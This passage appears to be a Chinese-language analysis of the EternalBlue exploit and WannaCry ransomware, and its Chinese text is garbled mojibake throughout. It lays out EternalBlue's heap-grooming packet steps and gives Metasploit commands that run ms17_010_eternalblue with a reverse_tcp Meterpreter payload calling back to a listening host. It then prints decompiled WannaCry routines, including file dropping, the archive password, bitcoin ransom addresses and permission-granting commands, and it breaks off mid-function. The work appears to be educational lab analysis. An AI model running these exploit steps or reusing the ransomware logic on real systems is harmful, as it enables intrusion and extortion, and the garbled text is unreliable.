æ­¤éœ€è¦ç‰¹æ®Šçš„æŠ€å·§æ¥åˆ©ç”¨è¿™äº›æ¼æ´ã€‚è¿™äº›æŠ€å·§éœ€è¦é€†å‘ä¸€äº›æ•°æ®ç»“æ„ 2.4.2 åˆ©ç”¨è¿‡ç¨‹EternalBlueé¦–å…ˆå‘é€ä¸€ä¸ªSRVbufferé™¤äº†æœ€åä¸€ä¸ªæ•°æ®åŒ…ã€‚è¿™æ˜¯å› ä¸ºå¤§éåˆ†é¡µæ± å°†åœ¨ä¼šè¯ä¸­æœ€åä¸€ä¸ªæ•°æ®åŒ…è¢«æœåŠ¡ç«¯æ¥æ”¶çš„æ—¶å€™è¢«å»ºç«‹ã€‚SMBæœåŠ¡å™¨ä¼šæŠŠä¼šè¯ä¸­æ¥å—åˆ°çš„æ•°æ®è¯»å–å¹¶å åŠ èµ·æ¥æ”¾å…¥è¾“å…¥ç¼“å†²åŒºä¸­ã€‚æ‰€æœ‰çš„æ•°æ®ä¼šåœ¨TRANSåŒ…ä¸­è¢«æ ‡æ˜ã€‚å½“æ¥æ”¶åˆ°æ‰€æœ‰çš„æ•°æ® SMBæœåŠ¡å™¨å°†ä¼šå¤„ç†è¿™äº›æ•°æ®ã€‚æ•°æ®é€šè¿‡CIFS(Common Internet File System)ä¼šè¢«åˆ†å‘åˆ°SrvOpen2å‡½æ•°ä¸­æ¥è¯»å–ã€‚ EternalBlueå‘é€çš„æ‰€æœ‰æ•°æ®ä¼šè¢«SMBæœåŠ¡å™¨æ”¶åˆ°åï¼ŒSMBæœåŠ¡å™¨ä¼šå‘é€SMB ECHOåŒ…ã€‚å› ä¸ºæ”»å‡»å¯ä»¥åœ¨ç½‘é€Ÿå¾ˆæ…¢çš„æƒ…å†µä¸‹å®ç°ï¼Œæ‰€ä»¥SMB ECHOæ˜¯å¾ˆé‡è¦çš„ã€‚ åœ¨æˆ‘ä»¬çš„åˆ†æä¸­ï¼Œå³ä½¿æˆ‘ä»¬å‘é€äº†åˆå§‹æ•°æ®ï¼Œå­˜åœ¨æ¼æ´çš„ç¼“å†²åŒºä»ç„¶æ²¡æœ‰è¢«åˆ†é…åœ¨å†…å­˜ä¸­ã€‚ 1.FreeHole_A: EternalBlueé€šè¿‡å‘é€SMB v1æ•°æ®åŒ…æ¥å®Œæˆå ä½ 2.SMBv2_1n: å‘é€ä¸€ç»„SMB v2æ•°æ®åŒ… 3.FreeHole_B: å‘é€å¦ä¸€ä¸ªå ä½æ•°æ®åŒ…ï¼›å¿…é¡»ç¡®ä¿ç¬¬ä¸€ä¸ªå ä½çš„FreeHole_Aè¢«é‡Šæ”¾ä¹‹å‰ï¼Œè¿™å—å†…å­˜è¢«åˆ†é… 4.FreeHole_A_CLOSE: å…³é—­è¿æ¥ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªå ä½çš„å†…å­˜ç©ºé—´è¢«é‡Šæ”¾ 5.SMBv2_2n: å‘é€ä¸€ç»„SMB v2æ•°æ®åŒ… 6.FreeHole_B_CLOSE: å…³é—­è¿æ¥æ¥é‡Šæ”¾ç¼“å†²åŒº 7.FINAL_Vulnerable_Buffer: å‘é€æœ€åçš„æ•°æ®åŒ…ï¼Œè¿™ä¸ªæ•°æ®åŒ…å°†ä¼šè¢«å­˜å‚¨åœ¨æœ‰æ¼æ´çš„ç¼“å†²åŒºä¸­ æœ‰æ¼æ´çš„ç¼“å†²åŒºï¼ˆä¹‹å‰SRVNETåˆ›å»ºçš„ï¼‰è¢«å¡«å…¥çš„æ•°æ®å°†ä¼šè¦†ç›–å’Œéƒ¨åˆ†SRVNETçš„ç¼“å†²åŒºã€‚åœ¨FEAlistè½¬æ¢åˆ°NTFEAlistæ—¶ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå› ä¸ºFEAç»“æ„ä¼šåœ¨è¦†ç›–SRVNETç¼“å†²åŒºä¹‹åå¤±æ•ˆï¼Œæ‰€ä»¥æœåŠ¡å™¨å°†ä»¥STATUS_INVALID_PARAMETERï¼ˆ0xC000000Dï¼‰è¿”å›ã€‚ 2.5 æ¼æ´æ”»å‡»2.5.1 å‡†å¤‡å·¥ä½œå‡†å¤‡ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kali-linux ä¸€å° win7ï¼Œä½¿ç”¨Wiresharkè¿›è¡ŒæŠ“åŒ…ï¼Œåˆ©ç”¨msfconsoleå·¥å…·è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡» 2.5.2 æ”»å‡»è¿‡ç¨‹1.è·å–ä¸¤å°ä¸»æœºçš„IPåœ°å€ 2.æµ‹è¯•ä¸¤å°ä¸»æœºçš„è¿é€šæ€§ 3.ä½¿å¾— kali çš„æ•°æ®ä¿æŒå¼€å¯ æµ‹è¯•æ˜¯å¦å¼€å¯ï¼š service postgresql status æ‰“å¼€æ•°æ®åº“ ï¼š service postgresql start åˆå§‹åŒ–æ•°æ®åº“ï¼š msfdb init 4.åˆ©ç”¨ msfconsole è¿›è¡Œæ¼æ´æ‰«æ å¯åŠ¨ï¼š msfconsole æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µï¼šdb_status æœç´¢æ¼æ´ï¼š search ms17_010 æ‰«æå‘½ä»¤ï¼šuse auxiliary/scanner/smb/smb_ms17_010 æ”»å‡»å‘½ä»¤ï¼ˆåé¢ä½¿ç”¨ï¼‰ï¼šuse exploit/windows/smb/ms17_010_eternalblue è®¾ç½®æ‰«æçš„ä¸»æœºæˆ–è€…ä¸»æœºæ®µï¼šset rhosts 192.168.223.141/24; è®¾ç½®æ‰«æçº¿ç¨‹ä¸º20ï¼š set threads 20ï¼› æœ€åè¾“å…¥runæ‰§è¡Œæ‰«æã€‚ åŒæ—¶ï¼Œåˆ©ç”¨ wiresharkæŠ“åŒ…å·¥å…·ï¼Œç›‘å¬ethO è¿›è¡Œæ”»å‡»ï¼šuse exploit/windows/smb/ms17_010_eternalblue è®¾ç½®æ”»å‡»ç›®æ ‡ï¼ˆé¶æœºï¼‰ï¼šset rhost 192.168.223.141 è®¾ç½®æ”»å‡»è½½è·ï¼šset payload windows/x64/meterpreter/reverse_tcp è®¾ç½®ç›‘å¬ä¸»æœºï¼ˆkaliï¼‰ï¼šset lhost 192.168.223.137 åˆ©ç”¨exploitè¿›è¡Œæ”»å‡»ï¼šexploit æˆåŠŸæ”»å‡»ï¼ï¼ å›¾1 æ‰“å¼€å¹¶åˆå§‹åŒ–æ•°æ®åº“ å›¾2 æ‰“å¼€msfconsole å¹¶æŸ¥æ‰¾ms17_010 4 ç—…æ¯’åˆ†æ4.1 åŸºç¡€é™æ€åˆ†æ4.1.1 æŸ¥å£³ç¬¬ä¸€æ­¥é˜²æ­¢å¼€å‘è€…å¯¹ç—…æ¯’è¿›è¡Œäº†åŒ…è£…ï¼Œå¯¹ç—…æ¯’è¿›è¡ŒæŸ¥å£³æ“ä½œï¼Œä»¥ä¸‹æ˜¯æŸ¥å£³ç»“æœ å›¾ä¸€ï¼šExeinfoæŸ¥å£³ é€šè¿‡ Lamer infoå­—æ®µçš„Not packedï¼Œæˆ‘ä»¬çŸ¥é“ç—…æ¯’æ— å£³ï¼Œçœå»äº†è„±å£³çš„éº»çƒ¦ 4.1.2 å­—ç¬¦ä¸²åˆ†æåˆ©ç”¨IDAå·¥å…·ä¸­æä¾›çš„ Strings Windowå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ç—…æ¯’æºæ–‡ä»¶ä¸­å«æœ‰çš„æ˜¾å¼çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸€æ­¥èƒ½å¸®æˆ‘ä»¬å¯¹ç—…æ¯’çš„å¤§è‡´åŠŸèƒ½å’ŒåŠ å¯†æ–¹å¼ç­‰ç”±å¤§è‡´çš„äº†è§£ã€‚ å›¾äºŒï¼šç—…æ¯’çš„å­—ç¬¦ä¸²ä¿¡æ¯ é€šè¿‡å­—ç¬¦ä¸²åˆ†æï¼Œæˆ‘ä»¬å¤§è‡´äº†è§£äº†ï¼Œç—…æ¯’å¯èƒ½åˆ©ç”¨äº†RSAå’ŒAESçš„åŠ å¯†æ–¹å¼ï¼ŒåŒæ—¶å’Œ TaskStart å‡½æ•°ï¼Œt.wnry,tasksche.exeç­‰æ–‡ä»¶æœ‰å¾ˆå¤§çš„å…³è”å…³ç³»ï¼Œè¿˜åˆ©ç”¨äº†CMDè°ƒç”¨äº†æŸäº›å‚æ•°ã€‚ 4.1.3 è¯†åˆ«åŠ å¯†ç®—æ³•é€šè¿‡ Kyrpto ANAlyzer æ’ä»¶è¯†åˆ«ç—…æ¯’æ–‡ä»¶çš„åŠ å¯†ç®—æ³• å›¾å››ï¼š è¯†åˆ«åŠ å¯†ç®—æ³• ç»è¿‡åˆ†æå¾—çŸ¥ï¼Œç—…æ¯’ä½¿ç”¨äº† CRC32 å’Œ AES åŠ å¯†ç®—æ³•ï¼ŒCryptDecrypt å’ŒCryptEncrypt æ˜¯å¾®è½¯æä¾›çš„åŠ å¯†ç±»åº“ï¼ŒZIP2å’ŒZLIB æ˜¯å‹ç¼©ç®—æ³• 4.1.4 æŸ¥çœ‹å¯¼å…¥è¡¨é€šè¿‡PEiDæä¾›çš„è¾“å…¥è¡¨æŸ¥çœ‹å™¨ï¼Œå¯¹ç—…æ¯’æºæ–‡ä»¶çš„è¾“å…¥è¡¨è¿›è¡ŒæŸ¥çœ‹ï¼Œæ¢å¯»ç—…æ¯’ã€‚ å›¾äº”ï¼šæŸ¥çœ‹ç—…æ¯’è¾“å…¥è¡¨ åœ¨Kernel32ä¸­å‘ç°ç—…æ¯’åˆ©ç”¨äº†LoadResourceï¼ŒLockResourceç­‰å‡½æ•°ï¼Œè¡¨æ˜äº†ç—…æ¯’èµ„æºæ®µä¸­å¯èƒ½è—æœ‰ç—…æ¯’éœ€è¦åˆ©ç”¨çš„å…¶ä»–æ–‡ä»¶ å›¾å…­ï¼šç—…æ¯’è¾“å…¥è¡¨-æ³¨å†Œè¡¨æ“ä½œ ç—…æ¯’åˆ©ç”¨äº†ADVAPI32.dllä¸­çš„RegCreateKeyWï¼ŒRegSetValueExAç­‰å‡½æ•°ï¼Œä»£è¡¨ç—…æ¯’æºç ä¸­æ¶‰åŠäº†å¯¹æ³¨å†Œè¡¨çš„æ“ä½œï¼Œå¯ä»¥åœ¨ç—…æ¯’æ‰§è¡Œå®Œåå¯¹æ³¨å†Œè¡¨è¿›è¡Œæ¯”è¾ƒã€‚ 4.1.5 æå–èµ„æºæ®µé€šè¿‡è¾“å…¥è¡¨çš„åˆ†æï¼Œæˆ‘ä»¬äº†è§£åˆ°ç—…æ¯’exeçš„èµ„æºæ®µä¸­å¯èƒ½éšè—ç€ç—…æ¯’æ‰€æ‹¥æœ‰çš„å…¶ä»–èµ„æºæ–‡ä»¶ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯¹èµ„æºæ–‡ä»¶è¿›è¡Œæå–ã€‚ å›¾ä¸ƒï¼šèµ„æºæ®µæŸ¥çœ‹ ä»èµ„æºæ®µåˆ†ææ¥çœ‹ï¼ŒXIAèµ„æºæ®µæœ€å€¼å¾—æˆ‘ä»¬å…³æ³¨ï¼Œåœ¨èµ„æºæ®µä¸­æˆ‘ä»¬å‘ç°èµ„æºæ®µå¤´çš„PKå­—æ®µï¼Œåˆ¤æ–­è¯¥èµ„æºæ®µåº”è¯¥æ˜¯rarçš„å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†èµ„æºæ®µæå–å‡ºæ¥ å›¾å…«ï¼šXIAèµ„æºæ®µ å‘ç°äº†éšè—åœ¨ç—…æ¯’èµ„æºæ®µçš„æ–‡ä»¶ å…¶ä¸­msgä¸­æ˜¯ä¸€äº›è¯­è¨€åŒ… 4.2 åŸºç¡€åŠ¨æ€åˆ†æ4.2.1 è¿›ç¨‹åˆ†æä½¿ç”¨ ProcessMonitor æŸ¥çœ‹è¿›ç¨‹æ ‘ å›¾ä¹ï¼šè¿›ç¨‹æ ‘ Wcry.exeæ€»å…±æ‹¥æœ‰5ä¸ªå­è¿›ç¨‹ï¼Œå…¶ä¸­cmdè´Ÿè´£æ‰§è¡Œä¸€äº›æ‰¹å¤„ç†æ–‡ä»¶ 4.2.2 æ³¨å†Œè¡¨åˆ†æä½¿ç”¨Regshot æ¯”è¾ƒç—…æ¯’æ‰§è¡Œå‰åçš„æ³¨å†Œè¡¨å˜åŒ– å›¾åï¼šregshotç»“æœ é€šè¿‡Regshotçš„æ¯”å¯¹ï¼Œæˆ‘ä»¬å‘ç°ç—…æ¯’å¢åŠ äº†ä¸€äº›åŠ è§£å¯†éœ€è¦çš„å¯†é’¥æ³¨å†Œè¡¨é¡¹å’Œè‡ªåŠ¨è¿è¡Œçš„ç—…æ¯’è·¯å¾„ä½ç½® 4.2.3 æ–‡ä»¶ç›‘æ§ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨ç«ç»’å‰‘æŠ“å–ç—…æ¯’è¿è¡Œè¿‡ç¨‹ä¸­ç—…æ¯’æ–‡ä»¶å¯¹äºæ–‡ä»¶çš„æ›´æ”¹ï¼Œ å›¾åä¸€ï¼šæ–‡ä»¶ç›‘æ§ é€šè¿‡å¯¹æ–‡ä»¶çš„ç›‘æ§ï¼Œæˆ‘ä»¬å‘ç°æ–‡ä»¶åœ¨ç—…æ¯’æ–‡ä»¶å¤¹é‡Œæ”¾ç½®äº† Pkyï¼Œekyï¼Œres æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç—…æ¯’æ‰€éœ€è¦çš„å…¬é’¥ï¼Œç§é’¥ç­‰æ–‡ä»¶ Bat æ–‡ä»¶ï¼Œæ˜¯ç—…æ¯’æ‰€éœ€è¦æ‰§è¡Œçš„ç¹æ‚çš„é‡å¤æ€§çš„å·¥ä½œ Vbs æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç—…æ¯’æ‰§è¡Œæ—¶çš„ä¸­é—´æ–‡ä»¶ï¼Œç”¨äºæ‰§è¡Œæ„ŸæŸ“æ“ä½œ å›¾åäºŒï¼šæ–‡ä»¶è¡Œä¸ºç›‘æ§ ç»§ç»­è¿›è¡Œæ–‡ä»¶è¡Œä¸ºçš„ç›‘æ§ï¼Œç›‘æ§åˆ°æ–‡ä»¶åœ¨è‡ªå·±çš„è·¯å¾„é‡Šæ”¾è§£å‹æ–‡ä»¶çš„æ“ä½œï¼Œå°è¯äº†æˆ‘ä»¬ä¹‹å‰å¯¹äºèµ„æºæ®µçš„åˆ†æã€‚ 4.2.4 æ„ŸæŸ“æ•ˆæœåœ¨ç—…æ¯’æ„ŸæŸ“åï¼Œåˆ†æç—…æ¯’æ„ŸæŸ“çš„ç»“æœï¼š å›¾åä¸‰ï¼šæ„ŸæŸ“ç—…æ¯’æ–‡ä»¶ å¯ä»¥çœ‹åˆ°ï¼Œç—…æ¯’åœ¨æ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹æ–°å»ºäº†ä¸€ä¸ª@Please_Read_Me@.txtå’Œ @WanaDecryptor@.exeç”¨äºè¦æ±‚ç”¨æˆ·æ”¯ä»˜è§£é”è´¦æˆ·ï¼Œå¹¶å°†å…¶ä»–æ–‡ä»¶åŠ å¯†ä¸ºä»¥.WNCRYçš„æ–‡ä»¶ 4.2.5 ç½‘ç»œç›‘æ§ å›¾åå››ï¼šç½‘ç»œè¿æ¥æƒ…å†µ é€šè¿‡åˆ†æç—…æ¯’é‡Šæ”¾çš„æ–‡ä»¶ taskhsvc.exeçš„è”ç½‘æƒ…å†µï¼Œæˆ‘ä»¬çœ‹åˆ°ç—…æ¯’ä¸€ç›´åœ¨å¯¹49159å’Œ9050ç«¯å£è¿›è¡Œç›‘å¬ï¼Œå¹¶åˆ©ç”¨ç«¯å£å°è¯•å¯¹å±€åŸŸç½‘å†…çš„ä¸€äº›IPè¿›è¡Œæ¸—é€ã€‚ 5 wncry.exe ç—…æ¯’ä¸»ç¨‹åºåˆ†æ5.1 ä¸»ä½“é€»è¾‘12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) &#123; Filename = byte_40F910; memset(&amp;v12, 0, 0x204u); // åˆå§‹åŒ–å†…å­˜ v13 = 0; v14 = 0; GetModuleFileNameA(0, &amp;Filename, 0x208u); // è·å–å½“å‰è¿›ç¨‹çš„å®Œæ•´è·¯å¾„ GetRandom((int)RandResult); // è·å–ä¸€ä¸²éšæœºçš„å­—æ¯+æ•°å­— if ( *(_DWORD *)_p___argc(Str) != 2 // å¦‚æœå‘½ä»¤è¡Œå‚æ•°ä¸ªæ•°ä¸ç­‰äº2 || (v5 = _p___argv(), strcmp(*(const char )(*(_DWORD *)v5 + 4), aI)) || !sub_401B5F(0) || (CopyFileA(&amp;Filename, FileName, 0), GetFileAttributesA(FileName) == -1) || !sub_401F5D() ) &#123; if ( strrchr(&amp;Filename, &#x27;&#x27;) ) // æŸ¥æ‰¾åœ¨å½“å‰æ–‡ä»¶è·¯å¾„ä¸­çš„ä½ç½® *strrchr(&amp;Filename, &#x27;&#x27;) = 0; SetCurrentDirectoryA(&amp;Filename); // åˆ‡æ¢å½“å‰çš„å·¥ä½œç›®å½• SetReg(1); // è®¾ç½®å½“å‰è¿›ç¨‹ç›®å½•åˆ°æ³¨å†Œè¡¨é¡¹ ReleaseFiles(0, ::Str); // é‡Šæ”¾æ–‡ä»¶å’Œè¯­è¨€åŒ…åˆ°å·¥ä½œè·¯å¾„ä¸‹ WriteCwnry(); // é‡å†™c.wnryæ–‡ä»¶ æ·»åŠ æ¯”ç‰¹å¸è´¦æˆ· ExeCmdCommand(CommandLine, 0, 0); // éšè—å½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ ExeCmdCommand(aIcaclsGrantEve, 0, 0); // æ·»åŠ Everyoneç”¨æˆ· æˆäºˆallè®¿é—®æƒé™ if ( GetApis() ) // è·å–ä¸€äº›å¿…è¦çš„APIå‡½æ•°åœ°å€ &#123; CDatabase::CDatabase(this); // æ„é€ å‡½æ•° åˆå§‹åŒ–ä¸´ç•ŒåŒº if ( ImportKeyAndAllocMem(this, 0, 0, 0) )// å¯¼å…¥ç§é’¥å¹¶ä¸”åˆ†é…ä¸¤å—å›ºå®šå†…å­˜ &#123; DecryptFileSize = 0; pFile = (void *)DecryptFile(this, t_wnry, (int)&amp;DecryptFileSize);// ä»t.wnryä¸­è§£å¯†å‡ºä¸€ä¸ªdllæ–‡ä»¶ if ( pFile ) &#123; pHeapBase = WriteAllocMem(pFile, DecryptFileSize);// ç”³è¯·ä¸€å—å †ç©ºé—´ å¹¶æŠŠè§£å¯†å‡ºçš„dllå†™å…¥åˆ°å †ç©ºé—´ pHeapBase=dll-&gt;Ntå¤´ if ( pHeapBase ) &#123; TaskStartAddr = (void (__stdcall *)(_DWORD, _DWORD))GetExportFunAddr((int)pHeapBase, TaskStart); if ( TaskStartAddr ) // ä»å †ç©ºé—´ä¸­å–å‡ºdllå¯¼å‡ºå‡½æ•°çš„åœ°å€ å¹¶è°ƒç”¨ TaskStartAddr(0, 0); &#125; &#125; &#125; CDatabase::~CDatabase((CDatabase *)this); // ææ„å‡½æ•° é‡Šæ”¾èµ„æº &#125; &#125; return 0; &#125; é€šè¿‡å¯¹ä¸»é¢˜çš„å®Œæ•´æ³¨é‡Šæˆ‘ä»¬å¤§è‡´äº†è§£äº†ç—…æ¯’æ‰€è¿›è¡Œçš„ä¸»è¦æ“ä½œï¼Œç»æ€»ç»“ä¸ºå¦‚ä¸‹è¿‡ç¨‹ï¼š åˆå§‹åŒ– å†…å­˜ï¼Œå·¥ä½œç›®å½•å’Œéšæœºæ•° è®¾ç½®æ³¨å†Œè¡¨é¡¹ä¸ºå½“å‰è¿›ç¨‹ç›®å½• é‡Šæ”¾èµ„æºåŒ…å†…çš„æ–‡ä»¶å’Œè¯­è¨€åŒ… åœ¨c.wnry å†…æ·»åŠ æ¯”ç‰¹å¸è´¦æˆ· éšè—å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ è¿›è¡ŒåŠ è§£å¯†æ“ä½œ é‡Šæ”¾èµ„æº ä»¥ä¸Šè¿‡ç¨‹èƒ½å®Œæ•´çš„å±•ç°å‡ºäº†ç—…æ¯’è¿›è¡Œçš„æ“ä½œï¼Œä½†æ˜¯æœ‰ä¸€äº›æ“ä½œç”±äºå‚æ•°è®¾ç½®é”™è¯¯ï¼Œå®é™…ä¸Šæ²¡æœ‰å®ç°ã€‚æ¥ä¸‹æ¥æˆ‘å°†å¯¹ç—…æ¯’çš„å…·ä½“è¡Œä¸ºè¿›è¡Œåˆ†ææ€»å…±åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ç¬¬ä¸€éƒ¨åˆ† åˆå§‹åŒ–æ“ä½œ ç¬¬äºŒéƒ¨åˆ† åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ 5.2 åˆå§‹åŒ–æ“ä½œåˆå§‹åŒ–ä½œä¸ºç—…æ¯’æ–‡ä»¶çš„ç¬¬ä¸€éƒ¨åˆ†ä¸»è¦æ¶‰åŠå‡ ä¸ªå‡½æ•°GetRandomè·å–éšæœºæ•°ï¼ŒSetRegè®¾ç½®æ³¨å†Œè¡¨ï¼ŒReleaseFilesé‡Šæ”¾èµ„æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†è¿›è¡Œé€ä¸€çš„åˆ†æ 5.2.1 GetRandom è·å–éšæœºæ•°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __cdecl GetRandom(int RandResult) &#123; GetComputerNameW(&amp;ComputerName, &amp;nSize); // è·å–è®¡ç®—æœºå i = 0; v1 = 1; if ( wcslen(&amp;ComputerName) ) // å¦‚æœè®¡ç®—æœºåçš„é•¿åº¦ä¸ä¸º0 &#123; v2 = &amp;ComputerName; do &#123; v1 *= *v2; // V1=[ComputerName] å³V1=è®¡ç®—æœºåçš„ç¬¬ä¸€ä¸ªå­—æ¯çš„ASCII ++i; // ä¸‹æ ‡è‡ªå¢ ++v2; // ComputerName++ä¸¤æ¬¡ å³æˆªæ–­è®¡ç®—æœºåçš„ç¬¬ä¸€ä¸ªå­—æ¯ v3 = wcslen(&amp;ComputerName); &#125; while ( i &lt; v3 ); &#125; // å¾ªç¯æ¬¡æ•°i=strlen(Computer) srand(v1); // v1=è®¡ç®—æœºåæ‰€æœ‰ASCIIçš„ä¹˜ç§¯ v4 = 0; v5 = rand() % 8 + 8; if ( v5 &gt; 0 ) &#123; do *(_BYTE *)(v4++ + RandResult) = rand() % 0x1A + 0x61;// éšæœºå–äº†ä¸€ä¸ªå­—ç¬¦ä¸² å‡è®¾ï¼šcecazrsga while ( v4 &lt; v5 ); &#125; v6 = v5 + 3; while ( v4 &lt; v6 ) *(_BYTE *)(v4++ + RandResult) = rand() % 0xA + 0x30;// éšæœºå–äº†ä¸€ä¸ªæ•°å­—122 result = RandResult; *(_BYTE *)(v4 + RandResult) = 0; return result; &#125; // æœ€åçš„ç»“æœç­‰äºä¸¤æ¬¡éšæœºç»“æœæ‹¼åœ¨ä¸€èµ· cecazrsga122 ç—…æ¯’é¦–å…ˆè·å–è®¡ç®—æœºåASCIIç çš„è¿ä¹˜ï¼Œå¹¶ä»¥å…¶ä½œä¸ºç§å­åˆ©ç”¨rand()å‡½æ•°å¾—åˆ°ä¸€å¯¹å­—æ¯+æ•°å­—çš„éšæœºæ•°ä½œä¸ºéšæœºå­—ç¬¦ä¸² 5.2.2 SetReg è®¾ç½®æ³¨å†Œè¡¨é¡¹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768signed int __cdecl SetReg(int a1) &#123; wcscat(&amp;Dest, Source); // å­—ç¬¦ä¸²æ‹¼æ¥-&gt;SoftwareWanaCrypt0r v12 = 0; while ( 1 ) &#123; if ( v12 ) RegCreateKeyW(HKEY_CURRENT_USER, &amp;Dest, &amp;hKey); else RegCreateKeyW(HKEY_LOCAL_MACHINE, &amp;Dest, &amp;hKey);// åˆ›å»ºäº†æ³¨å†Œè¡¨é¡¹ if ( hKey ) &#123; if ( a1 ) &#123; GetCurrentDirectoryA(0x207u, &amp;Buffer); // è·å–å½“å‰çš„è¿›ç¨‹æ‰€åœ¨ç›®å½• v1 = strlen(&amp;Buffer); // è·å–æ‰€åœ¨ç›®å½•çš„é•¿åº¦ v2 = RegSetValueExA(hKey, ValueName, 0, 1u, (const BYTE *)&amp;Buffer, v1 + 1) == 0;// å°†å½“å‰exeæ‰€åœ¨çš„è·¯å¾„è®¾ç½®ä¸ºæ³¨å†Œè¡¨é¡¹çš„å€¼ &#125; else &#123; cbData = 519; v3 = RegQueryValueExA(hKey, ValueName, 0, 0, (LPBYTE)&amp;Buffer, &amp;cbData); v2 = v3 == 0; if ( !v3 ) SetCurrentDirectoryA(&amp;Buffer); &#125; RegCloseKey(hKey); if ( v2 ) break; &#125; if ( ++v12 &gt;= 2 ) return 0; &#125; return 1; &#125; å¯è§ç—…æ¯’åˆ›å»ºäº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹å¹¶å°†å½“å‰ç—…æ¯’ä¸»ä½“æ‰€åœ¨ä½ç½®çš„å†³å®šè·¯å¾„è®¾ç½®åˆ°æ³¨å†Œè¡¨çš„HKEY_LOCAL_MACHINESOFTWARE ä¸‹ 5.2.3 ReleaseFiles é‡Šæ”¾èµ„æºæ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869int __cdecl ReleaseFiles(HMODULE hModule, char *Str) &#123; hRsrc = FindResourceA(hModule, (LPCSTR)0x80A, Type);HRSRC = hRsrc; if ( !hRsrc ) return 0; hGlobal = LoadResource(hModule, hRsrc); if ( !hGlobal ) // å°†èµ„æºè½½å…¥åˆ°å†…å­˜å¹¶é”å®š return 0; lpRes = LockResource(hGlobal); if ( !lpRes ) return 0; ResourceSize = SizeofResource(hModule, HRSRC);v7 = sub_4075AD(lpRes, ResourceSize, Str); // str=&quot;WNcry@2017&quot; å‡½æ•°è¿”å›1||0 if ( !v7 ) return 0; v11 = 0; memset(&amp;Str1, 0, 0x128u); SetReleasePath(v7, -1, (int)&amp;v11); // å°†0x24æ”¾åˆ°å†…å­˜ä¸­ v11=0x24 v9 = v11; v10 = 0; if ( v11 &gt; 0 ) &#123; do &#123; SetReleasePath(v7, (int)v10, (int)&amp;v11); // è®¾ç½®æ–‡ä»¶é‡Šæ”¾çš„è·¯å¾„ å¹¶ä¿å­˜åˆ°å†…å­˜ä¸­ if ( strcmp(&amp;Str1, Str2) || GetFileAttributesA(&amp;Str1) == -1 )// æ¯”è¾ƒb.wnryå’Œc.wnry ReleaseFile((int)v7, v10, &amp;Str1); // é‡Šæ”¾æ–‡ä»¶åˆ°å·¥ä½œç›®å½•ä¸‹ ++v10; &#125; while ( (signed int)v10 &lt; v9 ); &#125; FreeMemory(v7); // åšå†…å­˜é‡Šæ”¾ç­‰æ‰«å°¾å·¥ä½œ return 1; &#125; è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†èµ„æºåŒ…ä¸­çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è§£å‹å¯†ç â€WNcry@1017â€è¿›è¡Œè§£å‹åˆ°å½“å‰è¿›ç¨‹çš„è·¯å¾„ä¸‹ï¼Œæ–¹ä¾¿ä¸‹é¢çš„æ“ä½œè¿›ä¸€æ­¥åˆ©ç”¨å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ã€‚ 5.2.4 WriteCwnry é‡å†™c.wnry123456789101112131415161718192021int WriteCwnry() &#123; Source = a13am4vw2dhxygx; // 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94v5 = a12t9ydpgwuez9n; // 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw v6 = a115p7ummngoj1p; // 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn result = ReadOrWriteFileToMem(&amp;DstBuf, 1); // è¯»å–c.wnryåˆ°å†…å­˜ä¸­ if ( result ) &#123; v1 = rand(); strcpy(&amp;Dest, (&amp;Source)[v1 % 3]); // æ‹·è´éšæœºè´¦æˆ·åˆ°ç›®æ ‡å†…å­˜ result = ReadOrWriteFileToMem(&amp;DstBuf, 0); // å†™å…¥c.wnryåˆ°å†…å­˜ &#125; return result; &#125; å‡½æ•°éšæœºçš„å°†ä¸‰ä¸ªæ¯”ç‰¹å¸è´¦æˆ·ä¸­çš„ä¸€ä¸ªå†™å…¥c.wnryæ–‡ä»¶ä¸­ 5.2.5 ExeCmdCommand å‘½ä»¤è¡Œæ‰§è¡Œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl ExeCmdCommand(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode) &#123; struct _STARTUPINFOA StartupInfo; //è¯¥ç»“æ„ç”¨äºæŒ‡å®šæ–°è¿›ç¨‹çš„ä¸»çª—å£ç‰¹æ€§ struct _PROCESS_INFORMATION ProcessInformation; // [esp+4Ch] [ebp-10h] StartupInfo.cb = 68; memset(&amp;StartupInfo.lpReserved, 0, 0x40u); ProcessInformation.hProcess = 0; ProcessInformation.hThread = 0; ProcessInformation.dwProcessId = 0; ProcessInformation.dwThreadId = 0; StartupInfo.wShowWindow = 0; StartupInfo.dwFlags = 1; if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &amp;StartupInfo, &amp;ProcessInformation) ) return 0; // 